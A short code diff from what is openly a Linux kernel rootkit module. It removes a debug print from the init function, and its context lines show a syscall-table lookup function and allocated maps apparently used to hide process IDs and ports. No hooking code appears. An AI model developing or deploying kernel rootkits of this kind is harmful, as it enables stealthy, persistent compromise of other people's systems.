@@ -613,7 +613,6 @@ static void ** syscall_table_lookup(void)
 
 static int __init rootkit_init(void)
 {
-		printk(KERN_INFO "We made it boys");
                 pid_map = (char *)kmalloc(sizeof(char) * 32768, GFP_KERNEL);
                 //pid_map[41548] = 1;
                 port_map = (char *)kmalloc(sizeof(char) * 65537, GFP_KERNEL);
